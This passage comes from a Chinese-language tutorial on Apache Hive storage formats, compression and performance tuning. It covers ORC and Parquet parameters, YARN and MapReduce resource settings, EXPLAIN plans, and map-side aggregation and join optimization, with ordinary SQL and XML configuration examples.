ORC文件格式支持的参数如下</span></span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>参数</strong></th><th><strong>默认值</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>orc.compress</td><td>ZLIB</td><td>压缩格式，可选项：NONE、ZLIB,、SNAPPY，一般和SNAPPY配合</td></tr><tr><td>orc.compress.size</td><td>262,144</td><td>每个压缩块的大小（ORC文件是分块压缩的）</td></tr><tr><td>orc.stripe.size</td><td>67,108,864</td><td>每个stripe的大小</td></tr><tr><td>orc.row.index.stride</td><td>10,000</td><td>索引步长（每隔多少行数据建一条索引）</td></tr></tbody></table><h3 id="3-3-parquet">3.3 parquet</h3><p>Parquet文件是Hadoop生态中的一个通用的文件格式，它也是一个列式存储的文件格式。Parquet文件的格式如下图所示</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334402.png" alt></p><p>上图展示了一个Parquet文件的基本结构，文件的首尾都是该文件的Magic Code，用于校验它是否是一个Parquet文件。首尾中间由若干个Row Group和一个Footer（File Meta Data）组成。每个Row Group包含多个Column Chunk，每个Column Chunk包含多个Page。以下是Row Group、Column，Chunk和Page三个概念的说明：</p><ul><li><strong>行组（Row Group）</strong>：一个行组对应逻辑表中的若干行</li><li><strong>列块（Column Chunk）</strong>：一个行组中的一列保存在一个列块中</li><li><strong>页（Page）</strong>：一个列块的数据会划分为若干个页</li><li>Footer（File Meta Data）中存储了每个行组（Row Group）中的每个列快（Column Chunk）的元数据信息，元数据信息包含了该列的数据类型、该列的编码方式、该类的Data Page位置等信息。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> parquet_table</span><br><span class="line">(column_specs)</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line">tblproperties (property_name=property_value, ...);</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>参数</strong></th><th><strong>默认值</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>parquet.compression</td><td>uncompressed</td><td>压缩格式，可选项：uncompressed，snappy，gzip，lzo，brotli，lz4</td></tr><tr><td>parquet.block.size</td><td>134217728</td><td>行组大小，通常与HDFS块大小保持一致</td></tr><tr><td>parquet.page.size</td><td>1048576</td><td>页大小</td></tr></tbody></table><h2 id="4、压缩">4、压缩</h2><p>hive的压缩和hadoop保持一致，详情参考hadoop</p><table><thead><tr><th><strong>压缩格式</strong></th><th><strong>算法</strong></th><th><strong>文件扩展名</strong></th><th><strong>是否可切分</strong></th></tr></thead><tbody><tr><td>DEFLATE</td><td>DEFLATE</td><td>.deflate</td><td>否</td></tr><tr><td>Gzip</td><td>DEFLATE</td><td>.gz</td><td>否</td></tr><tr><td>bzip2</td><td>bzip2</td><td>.bz2</td><td><strong>是</strong></td></tr><tr><td>LZO</td><td>LZO</td><td>.lzo</td><td><strong>是</strong></td></tr><tr><td>Snappy</td><td>Snappy</td><td>.snappy</td><td>否</td></tr></tbody></table><h3 id="4-1-Hive表数据进行压缩">4.1 Hive表数据进行压缩</h3><blockquote><p>在Hive中，不同文件类型的表，声明数据压缩的方式是不同的</p></blockquote><p><strong>TextFile</strong></p><p>若一张表的文件类型为TextFile，若需要对该表中的数据进行压缩，多数情况下，无需在建表语句做出声明。直接将压缩后的文件导入到该表即可，Hive在查询表中数据时，可自动识别其压缩格式，进行解压。需要注意的是，在执行往表中导入数据的SQL语句时，用户需设置以下参数，来保证写入表中的数据是被压缩的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--SQL语句的最终输出结果是否压缩</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.compress.output=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--输出结果的压缩格式（以下示例为snappy）</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.output.fileoutputformat.compress.codec =org.apache.hadoop.io.compress.SnappyCodec;</span><br></pre></td></tr></table></figure><p><strong>ORC</strong></p><p>若一张表的文件类型为ORC，若需要对该表数据进行压缩，需在建表语句中声明压缩</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> orc_table</span><br><span class="line">(column_specs)</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> orc</span><br><span class="line">tblproperties (<span class="string">"orc.compress"</span>=<span class="string">"snappy"</span>);</span><br></pre></td></tr></table></figure><p><strong>Parquet</strong></p><p>若一张表的文件类型为Parquet，若需要对该表数据进行压缩</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> orc_table</span><br><span class="line">(column_specs)</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line">tblproperties (<span class="string">"parquet.compression"</span>=<span class="string">"snappy"</span>);</span><br></pre></td></tr></table></figure><h3 id="4-2-计算过程中使用压缩">4.2 计算过程中使用压缩</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单个MR的中间结果进行压缩</span></span><br><span class="line"><span class="comment"># 单个MR的中间结果是指Mapper输出的数据，对其进行压缩可降低shuffle阶段的网络IO</span></span><br><span class="line"><span class="comment">--开启MapReduce中间数据压缩功能</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.map.output.compress=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--设置MapReduce中间数据数据的压缩方式（以下示例为snappy）</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.map.output.compress.codec=org.apache.hadoop.io.compress.SnappyCodec;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单条SQL语句的中间结果进行压缩</span></span><br><span class="line"><span class="comment"># 单条SQL语句的中间结果是指，两个MR（一条SQL语句可能需要通过MR进行计算）之间的临时数据</span></span><br><span class="line"><span class="comment">--是否对两个MR之间的临时数据进行压缩</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.compress.intermediate=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--压缩格式（以下示例为snappy）</span></span><br><span class="line"><span class="keyword">set</span> hive.intermediate.compression.codec= org.apache.hadoop.io.compress.SnappyCodec;</span><br></pre></td></tr></table></figure><h1>五、企业级调优</h1><h2 id="1、计算资源配置">1、计算资源配置</h2><h3 id="1-1-Yarn资源配置">1.1 Yarn资源配置</h3><ul><li><code>yarn.nodemanager.resource.memory-mb</code>该参数的含义是，一个NodeManager节点分配给Container使用的内存。该参数的配置，取决于NodeManager所在节点的总内存容量和该节点运行的其他服务的数量，默认8G</li><li><code>yarn.nodemanager.resource.cpu-vcores</code>该参数的含义是，一个NodeManager节点分配给Container使用的CPU核数。该参数的配置，同样取决于NodeManager所在节点的总CPU核数和该节点运行的其他服务，默认8核，一般一个核心对于4g</li><li><code>yarn.scheduler.maximum-allocation-mb</code>该参数的含义是，单个Container能够使用的最大内存</li><li><code>yarn.scheduler.minimum-allocation-mb</code>该参数的含义是，单个Container能够使用的最小内存</li></ul><p>修改$HADOOP_HOME/etc/hadoop/yarn-site.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>65536<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.cpu-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>16<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>16384<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>512<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-MapReduce资源配置">1.2 MapReduce资源配置</h3><p>MapReduce资源配置主要包括Map Task的内存和CPU核数，以及Reduce Task的内存和CPU核数。核心配置参数如下：</p><ul><li><code>mapreduce.map.memory.mb</code>  该参数的含义是，单个Map Task申请的container容器内存大小，<strong>其默认值为1024</strong>。该值不能超出yarn.scheduler.maximum-allocation-mb和yarn.scheduler.minimum-allocation-mb规定的范围。该参数需要根据不同的计算任务单独进行配置，在hive中，可直接使用如下方式为每个SQL语句单独进行配置：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>  mapreduce.map.memory.mb=<span class="number">2048</span>;</span><br></pre></td></tr></table></figure><ul><li><code>mapreduce.map.cpu.vcores</code> 该参数的含义是，单个Map Task申请的container容器cpu核数，其默认值为1。该值一般无需调整</li><li><code>mapreduce.reduce.memory.mb</code>  该参数的含义是，单个Reduce Task申请的container容器内存大小，其默认值为1024。该值同样不能超出yarn.scheduler.maximum-allocation-mb和yarn.scheduler.minimum-allocation-mb规定的范围。该参数需要根据不同的计算任务单独进行配置，在hive中，可直接使用如下方式为每个SQL语句单独进行配置：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>  mapreduce.reduce.memory.mb=<span class="number">2048</span>;</span><br></pre></td></tr></table></figure><ul><li><code>mapreduce.reduce.cpu.vcores</code>  该参数的含义是，单个Reduce Task申请的container容器cpu核数，其默认值为1。该值一般无需调整</li></ul><h2 id="2、测试用表">2、测试用表</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 资料包自行领取，https://download.csdn.net/download/lemon_TT/87685013</span></span><br><span class="line"><span class="comment"># 订单表(2000w条数据)</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> order_detail;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> order_detail(</span><br><span class="line">    <span class="keyword">id</span>           <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'订单id'</span>,</span><br><span class="line">    user_id      <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'用户id'</span>,</span><br><span class="line">    product_id   <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'商品id'</span>,</span><br><span class="line">    province_id  <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'省份id'</span>,</span><br><span class="line">    create_time  <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'下单时间'</span>,</span><br><span class="line">    product_num  <span class="built_in">int</span> <span class="keyword">comment</span> <span class="string">'商品件数'</span>,</span><br><span class="line">    total_amount <span class="built_in">decimal</span>(<span class="number">16</span>, <span class="number">2</span>) <span class="keyword">comment</span> <span class="string">'下单金额'</span></span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span> (dt <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="comment"># 装载</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/order_detail.txt'</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> order_detail <span class="keyword">partition</span>(dt=<span class="string">'2020-06-14'</span>);</span><br><span class="line"><span class="comment"># 支付表(600w条数据)</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> payment_detail;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> payment_detail(</span><br><span class="line">    <span class="keyword">id</span>              <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'支付id'</span>,</span><br><span class="line">    order_detail_id <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'订单明细id'</span>,</span><br><span class="line">    user_id         <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'用户id'</span>,</span><br><span class="line">    payment_time    <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'支付时间'</span>,</span><br><span class="line">    total_amount    <span class="built_in">decimal</span>(<span class="number">16</span>, <span class="number">2</span>) <span class="keyword">comment</span> <span class="string">'支付金额'</span></span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span> (dt <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="comment"># 装载</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/payment_detail.txt'</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> payment_detail <span class="keyword">partition</span>(dt=<span class="string">'2020-06-14'</span>);</span><br><span class="line"><span class="comment"># 商品信息表(100w条数据)</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> product_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> product_info(</span><br><span class="line">    <span class="keyword">id</span>           <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'商品id'</span>,</span><br><span class="line">    product_name <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'商品名称'</span>,</span><br><span class="line">    price        <span class="built_in">decimal</span>(<span class="number">16</span>, <span class="number">2</span>) <span class="keyword">comment</span> <span class="string">'价格'</span>,</span><br><span class="line">    category_id  <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'分类id'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/product_info.txt'</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> product_info;</span><br><span class="line"><span class="comment"># 省份信息表(34条数据)</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> province_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> province_info(</span><br><span class="line">    <span class="keyword">id</span>            <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'省份id'</span>,</span><br><span class="line">    province_name <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'省份名称'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/province_info.txt'</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> province_info;</span><br></pre></td></tr></table></figure><h2 id="3、Explain查看执行计划-重点">3、Explain查看执行计划(重点)</h2><h3 id="3-1-Explain执行计划概述">3.1 Explain执行计划概述</h3><p>Explain呈现的执行计划，由一系列Stage组成，这一系列Stage具有依赖关系，每个Stage对应一个MapReduce Job，或者一个文件系统操作等。</p><p>若某个Stage对应的一个MapReduce Job，其Map端和Reduce端的计算逻辑分别由Map Operator Tree和Reduce Operator Tree进行描述，Operator Tree由一系列的Operator组成，一个Operator代表在Map或Reduce阶段的一个单一的逻辑操作，例如TableScan Operator，Select Operator，Join Operator等</p><ul><li>TableScan：表扫描操作，通常map端第一个操作肯定是表扫描操作</li><li>Select Operator：选取操作</li><li>Group By Operator：分组聚合操作</li><li>Reduce Output Operator：输出到 reduce 操作</li><li>Filter Operator：过滤操作</li><li>Join Operator：join 操作</li><li>File Output Operator：文件输出操作</li><li>Fetch Operator 客户端获取数据操作</li></ul><h3 id="3-2-基本用法">3.2 基本用法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> [FORMATTED | <span class="keyword">EXTENDED</span> | DEPENDENCY] <span class="keyword">query</span>-<span class="keyword">sql</span></span><br><span class="line"><span class="comment"># FORMATTED、EXTENDED、DEPENDENCY关键字为可选项，各自作用如下。</span></span><br><span class="line"><span class="comment"># FORMATTED：将执行计划以JSON字符串的形式输出</span></span><br><span class="line"><span class="comment"># EXTENDED：输出执行计划中的额外信息，通常是读写的文件名等信息</span></span><br><span class="line"><span class="comment"># DEPENDENCY：输出执行计划读取的表及分区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">explain</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    user_id,</span><br><span class="line">    <span class="keyword">count</span>(*)</span><br><span class="line"><span class="keyword">from</span> order_detail</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> user_id;</span><br></pre></td></tr></table></figure><h2 id="4、-HQL之分组聚合优化">4、 HQL之分组聚合优化</h2><h3 id="4-1-优化说明">4.1 优化说明</h3><p>Hive中未经优化的分组聚合，是通过一个MapReduce Job实现的。Map端负责读取数据，并按照分组字段分区，通过Shuffle，将数据发往Reduce端，各组数据在Reduce端完成最终的聚合运算。</p><p>Hive对<strong>分组聚合的优化主要围绕着减少Shuffle数据量进行</strong>，具体做法是map-side聚合。所谓map-side聚合，就是在map端维护一个hash table，利用其完成部分的聚合，然后将部分聚合的结果，按照分组字段分区，发送至reduce端，完成最终的聚合。map-side聚合能有效减少shuffle的数据量，提高分组聚合运算的效率</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用map-side聚合</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用于检测源表数据是否适合进行map-side聚合。检测的方法是：先对若干条数据进行map-side聚合，</span></span><br><span class="line"><span class="comment"># 若聚合后的条数和聚合前的条数比值小于该值，则认为该表适合进行map-side聚合；否则，认为该表数据不适合进行map-side聚合，后续数据便不再进行map-side聚合。</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.min.reduction=<span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用于检测源表是否适合map-side聚合的条数。</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.mapaggr.checkinterval=<span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--map-side聚合所用的hash table，占用map task堆内存的最大比例，若超出该值，则会对hash table进行一次flush。</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.force.flush.memory.threshold=<span class="number">0.9</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 举例</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    product_id,</span><br><span class="line">    <span class="keyword">count</span>(*)</span><br><span class="line"><span class="keyword">from</span> order_detail</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> product_id;</span><br></pre></td></tr></table></figure><h2 id="5、HQL之Join优化">5、HQL之Join优化</h2><h3 id="5-1-Join算法概述">5.1 Join算法概述</h3><blockquote><p>Hive拥有多种join算法，包括Common Join，Map Join，Bucket Map Join，Sort Merge Buckt Map Join等</p></blockquote><p><strong>Common Join</strong></p><p>Common Join是Hive中最稳定的join算法，其通过一个MapReduce Job完成一个join操作。Map端负责读取join操作所需表的数据，并按照关联字段进行分区，通过Shuffle，将其发送到Reduce端，相同key的数据在Reduce端完成最终的Join操作</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334403.png" alt></p><p>需要<strong>注意</strong>的是，sql语句中的join操作和执行计划中的Common Join任务并非一对一的关系，一个sql语句中的<strong>相邻</strong>的且<strong>关联字段相同</strong>的多个join操作可以合并为一个Common Join任务</p><p><strong>Map Join</strong></p><p>Map Join算法可以通过两个只有map阶段的Job完成一个join操作。其适用场景为大表join小表。若某join操作满足要求，则第一个Job会读取小表数据，将其制作为hash table，并上传至Hadoop分布式缓存（本质上是上传至HDFS）。第二个Job会先从分布式缓存中读取小表数据，并缓存在Map Task的内存中，然后扫描大表数据，这样在map端即可完成关联操作</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334404.png" alt></p><p><strong>Bucket Map Join</strong></p><p>Bucket Map Join是对Map Join算法的改进，其打破了Map Join只适用于大表join小表的限制，可用于大表join大表的场景。Bucket Map Join的核心思想是：<strong>若能保证参与join的表均为分桶表，且关联字段为分桶字段，且其中一张表的分桶数量是另外一张表分桶数量的整数倍，就能保证参与join的两张表的分桶之间具有明确的关联关系，所以就可以在两表的分桶间进行Map Join操作了</strong>。这样一来，第二个Job的Map端就无需再缓存小表的全表数据了，而只需缓存其所需的分桶即可。</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334405.png" alt></p><p><strong>Sort</strong> <strong>Merge</strong> <strong>Bucket Map Join</strong></p><p>Sort Merge Bucket Map Join（简称SMB Map Join）基于Bucket Map Join。SMB Map Join要求，参与join的表均为分桶表，且需保证分桶内的数据是有序的，且分桶字段、排序字段和关联字段为相同字段，且其中一张表的分桶数量是另外一张表分桶数量的整数倍。</p><p>SMB Map Join同Bucket Join一样，同样是利用两表各分桶之间的关联关系，在分桶之间进行join操作，不同的是，分桶之间的join操作的实现原理。Bucket Map Join，两个分桶之间的join实现原理为Hash Join算法；而SMB Map Join，两个分桶之间的join实现原理为Sort Merge Join算法。Hash Join和Sort Merge Join均为关系型数据库中常见的Join实现算法。Hash Join的原理相对简单，就是对参与join的一张表构建hash table，然后扫描另外一张表，然后进行逐行匹配。Sort Merge Join需要在两张按照关联字段排好序的表中进行</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334406.png" alt></p><p>Hive中的SMB Map Join就是对两个分桶的数据按照上述思路进行Join操作。可以看出，SMB Map Join与Bucket Map Join相比，在进行Join操作时，Map端是无需对整个Bucket构建hash table，也无需在Map端缓存整个Bucket数据的，每个Mapper只需按顺序逐个key读取两个分桶的数据进行join即可</p><h3 id="5-2-Map-Join">5.2 Map Join</h3><blockquote><p>Map Join有两种触发方式，一种是用户在SQL语句中增加hint提示，另外一种是Hive优化器根据参与join表的数据量大小，自动触发</p></blockquote><p>**Hint提示，**用户可通过如下方式，指定通过map join算法，并且ta将作为map join中的小表。这种方式已经过时，不推荐使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="comment">/*+ mapjoin(ta) */</span></span><br><span class="line">    ta.id,</span><br><span class="line">    tb.id</span><br><span class="line"><span class="keyword">from</span> table_a ta</span><br><span class="line"><span class="keyword">join</span> table_b tb</span><br><span class="line"><span class="keyword">on</span> ta.id=tb.id;</span><br></pre></td></tr></table></figure><p><strong>自动触发</strong></p><p>Hive在编译SQL语句阶段，<strong>起初所有的join操作均采用Common Join算法</strong>实现。之后在物理优化阶段，Hive会根据每个Common Join任务所需表的大小判断该Common Join任务是否能够转换为Map Join任务，若满足要求，便将Common Join任务自动转换为Map Join任务。</p><p>但有些Common Join任务所需的表大小，在SQL的编译阶段是未知的（例如对子查询进行join操作），所以这种Common Join任务是否能转换成Map Join任务在编译阶是无法确定的。针对这种情况，Hive会在编译阶段<strong>生成一个条件任务（Conditional Task），其下会包含一个计划列表</strong>，计划列表中包含转换后的Map Join任务以及原有的Common Join任务。最终具体采用哪个计划，是在运行时决定的</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334407.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251334408.png" alt></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启动Map Join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--一个Common Join operator转为Map Join operator的判断条件,若该Common Join相关的表中,存在n-1张表的已知大小总和&lt;=该值,则生成一个Map Join计划,此时可能存在多种n-1张表的组合均满足该条件,</span></span><br><span class="line"><span class="comment"># 则hive会为每种满足条件的组合均生成一个Map Join计划,同时还会保留原有的Common Join计划作为后备(back up)计划,实际运行时,优先执行Map Join计划，若不能执行成功，则启动Common Join后备计划。</span></span><br><span class="line"><span class="keyword">set</span> hive.mapjoin.smalltable.filesize=<span class="number">250000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--开启无条件转Map Join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--无条件转Map Join时的小表之和阈值,若一个Common Join operator相关的表中，存在n-1张表的大小总和&lt;=该值,此时hive便不会再为每种n-1张表的组合均生成Map Join计划,同时也不会保留Common Join作为后备计划。而是只生成一个最优的Map Join计划。</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask.size=<span class="number">10000000</span>;</span><br></pre></td></tr></table></figure><p>优化案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 